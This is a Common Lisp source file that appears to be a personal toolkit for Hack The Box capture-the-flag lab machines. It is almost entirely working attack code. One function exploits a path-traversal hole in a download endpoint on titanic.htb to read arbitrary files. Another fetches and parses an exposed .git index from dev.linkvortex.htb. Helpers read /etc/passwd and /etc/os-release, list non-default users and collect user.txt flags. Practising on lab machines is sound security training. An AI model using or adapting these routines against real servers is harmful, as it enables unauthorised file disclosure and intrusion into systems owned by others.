(in-package #:grimoire)

(defparameter *default-users* (load-data "default-users.txt"))
(defparameter *interesting-files* (load-data "interesting-files.txt"))

(defparameter *capacities* (make-hash-table :test #'equal))

;; Machine functions

(defun titanic/read-file (path)
  (let* ((url (format nil "http://titanic.htb/download?ticket=../../../../~a" path))
         (res (dex:get url)))
    (handler-case (trivial-utf-8:utf-8-bytes-to-string res)
      (error (c) 
        (format t "[+] Error reading file: ~a~%" c)
        res))))

;; Generic functions

(defun test () 
  (let ((stream (flexi-streams:make-in-memory-input-stream 
                 (grm/exposed-git "http://dev.linkvortex.htb/"))))
    (let ((header (read-git-header stream)))
      (loop for i from 0 upto (1- (cdr header))
            do (format t "~a~%" (cdr (read-git-entry stream)))))))

(grm/defun grm/exposed-git () (url)
  (dex:get (str:concat url ".git/index")))

(grm/defun grm/system-info (:read) ()
  "list all the users from /etc/passwd"
  (grm/read-into-string "/etc/os-release"))

(grm/defun grm/all-users (:read) ()
  "list all the users from /etc/passwd"
  (loop for line in (str:lines (grm/read-into-string "/etc/passwd"))
        if (not (alexandria:emptyp line))
        collect (car (str:split ":" line))))

(grm/defun grm/users (:read) ()
  "list the users that are not default"
  (let ((all-users (grm/all-users)))
    (remove-if #'(lambda (u) (member u *default-users* :test #'equal)) 
               all-users)))

(grm/defun grm/user-flag (:read) ()
  (loop for user in (grm/users)
        return (str:trim 
                (grm/read-into-string
                 (format nil "/home/~a/user.txt" user)))))

(grm/defun grm/interesting-files (:read) ()
  nil)